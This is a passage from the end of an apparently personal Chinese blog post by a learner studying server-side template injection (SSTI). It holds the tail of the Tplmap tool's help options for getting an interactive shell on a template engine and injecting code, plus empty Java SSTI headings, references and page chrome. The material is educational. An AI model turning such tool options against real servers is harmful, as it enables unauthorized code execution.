</span><br><span class="line">模板检查:</span><br><span class="line">  --tpl-shell         在模板引擎上提示交互式Shell</span><br><span class="line">  --tpl-code=TPL_C..  在模板引擎中注入代码</span><br><span class="line"> </span><br><span class="line">常规:</span><br><span class="line">  --force-level=FO..  强制将测试级别设置为此值</span><br><span class="line">  --injection-tag=..  使用字符串作为注入标签 (default <span class="string">&#x27;*&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="JavaSSTI"><a href="#JavaSSTI" class="headerlink" title="JavaSSTI"></a>JavaSSTI</h1><h2 id="velocity"><a href="#velocity" class="headerlink" title="velocity"></a>velocity</h2><h2 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h2><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>留个坑，现在才刚刚基本算是结束学Web之旅的PHP体系，这个暑假开始刷题攒经验，过后开始进军Java等语言，学Web的旅途仍有很长的路要走</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html" > SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/14797393.html" >SSTI(模板注入)–Flask(萌新向)<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/272393#h2-0" >Smarty 模板注入与沙箱逃逸-安全客 - 安全资讯平台 (anquanke.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/EC_Carrot/article/details/109709767" >(39条消息) Tplmap的安装与用法（内包含解决缺少库报错的处理教程）_小 白 萝 卜的博客-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
+<p>还有看过的可能忘记了,私密马赛</p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                SSTI(Server-Side Template Injection)模板注入的初学习
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2026/03/02/SSTI(Server-Side Template Injection)模板注入的初学习/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">Nbc</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2026-03-02 14:22</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Python%E5%AE%89%E5%85%A8/">Python安全</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2026/03/02/commons-collections%E4%B8%8Ecommons-collections4%E4%B8%ADtransform%E6%96%B9%E6%B3%95%E7%9A%84%E5%8C%BA%E5%88%AB/"
+                                   title="cc和cc4中transform方法的区别"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">cc和cc4中transform方法的区别</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/03/02/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%9D%E5%AD%A6%E4%B9%A0/"
+                                   title="Python反序列化的初学习"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Python反序列化的初学习</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSTI-Server-Side-Template-Injection-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%9D%E5%AD%A6%E4%B9%A0"><span class="nav-text">SSTI(Server-Side Template Injection)模板注入的初学习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSSTI"><span class="nav-text">什么是SSTI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Php%E4%B8%AD%E7%9A%84SSTI"><span class="nav-text">Php中的SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#TWIG"><span class="nav-text">TWIG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Smarty"><span class="nav-text">Smarty</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Smarty%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="nav-text">Smarty的搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Smarty%E9%87%8C%E7%9A%84SSTI"><span class="nav-text">Smarty里的SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Smarty%E9%87%8C%E6%9C%89%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E6%8F%90%E4%BE%9B%E7%BB%99%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8"><span class="nav-text">Smarty里有静态方法提供给我们使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#getStreamVariable"><span class="nav-text">getStreamVariable()</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%84%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">一些常规的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#smarty-version"><span class="nav-text">{$smarty.version}</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-php"><span class="nav-text">{php}{&#x2F;php}</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#literal"><span class="nav-text">{literal}</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#if-if"><span class="nav-text">{if}{&#x2F;if}</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Smarty%E9%87%8C%E7%9A%84CVE"><span class="nav-text">Smarty里的CVE</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blade"><span class="nav-text">Blade</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Python%E4%B8%ADSSTI"><span class="nav-text">Python中SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Jinjia2"><span class="nav-text">Jinjia2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83"><span class="nav-text">搭建环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%9F%BA%E7%A1%80"><span class="nav-text">代码基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#class"><span class="nav-text">class</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base"><span class="nav-text">base</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subclasses"><span class="nav-text">subclasses</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#init"><span class="nav-text">init</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins"><span class="nav-text">builtins</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9BPayload"><span class="nav-text">一些Payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%B1%BB%E8%84%9A%E6%9C%AC"><span class="nav-text">查类脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#os"><span class="nav-text">os</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins-1"><span class="nav-text">builtins</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95WAF"><span class="nav-text">绕WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-text">过滤[</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="nav-text">过滤引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="nav-text">过滤下划线</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E8%8A%B1%E6%8B%AC%E5%8F%B7"><span class="nav-text">过滤花括号</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tornado"><span class="nav-text">Tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Django"><span class="nav-text">Django</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tplmap"><span class="nav-text">Tplmap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JavaSSTI"><span class="nav-text">JavaSSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#velocity"><span class="nav-text">velocity</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FreeMarker"><span class="nav-text">FreeMarker</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-text">结语</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Nbc</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSTI-Server-Side-Template-Injection-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%9D%E5%AD%A6%E4%B9%A0"><span class="nav-text">SSTI(Server-Side Template Injection)模板注入的初学习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSSTI"><span class="nav-text">什么是SSTI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Php%E4%B8%AD%E7%9A%84SSTI"><span class="nav-text">Php中的SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#TWIG"><span class="nav-text">TWIG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Smarty"><span class="nav-text">Smarty</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Smarty%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="nav-text">Smarty的搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Smarty%E9%87%8C%E7%9A%84SSTI"><span class="nav-text">Smarty里的SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Smarty%E9%87%8C%E6%9C%89%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E6%8F%90%E4%BE%9B%E7%BB%99%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8"><span class="nav-text">Smarty里有静态方法提供给我们使用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#getStreamVariable"><span class="nav-text">getStreamVariable()</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%84%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">一些常规的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#smarty-version"><span class="nav-text">{$smarty.version}</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-php"><span class="nav-text">{php}{&#x2F;php}</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#literal"><span class="nav-text">{literal}</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#if-if"><span class="nav-text">{if}{&#x2F;if}</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Smarty%E9%87%8C%E7%9A%84CVE"><span class="nav-text">Smarty里的CVE</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blade"><span class="nav-text">Blade</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Python%E4%B8%ADSSTI"><span class="nav-text">Python中SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Jinjia2"><span class="nav-text">Jinjia2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83"><span class="nav-text">搭建环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%9F%BA%E7%A1%80"><span class="nav-text">代码基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#class"><span class="nav-text">class</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base"><span class="nav-text">base</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subclasses"><span class="nav-text">subclasses</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#init"><span class="nav-text">init</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins"><span class="nav-text">builtins</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9BPayload"><span class="nav-text">一些Payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%B1%BB%E8%84%9A%E6%9C%AC"><span class="nav-text">查类脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#os"><span class="nav-text">os</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins-1"><span class="nav-text">builtins</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95WAF"><span class="nav-text">绕WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-text">过滤[</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="nav-text">过滤引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="nav-text">过滤下划线</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E8%8A%B1%E6%8B%AC%E5%8F%B7"><span class="nav-text">过滤花括号</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tornado"><span class="nav-text">Tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Django"><span class="nav-text">Django</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tplmap"><span class="nav-text">Tplmap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JavaSSTI"><span class="nav-text">JavaSSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#velocity"><span class="nav-text">velocity</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FreeMarker"><span class="nav-text">FreeMarker</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-text">结语</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">参考链接</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/lazyload.min.js"></script>
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/post/copyright-info.min.js"></script>
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+    
+        
+    
+
+</body>
+</html>
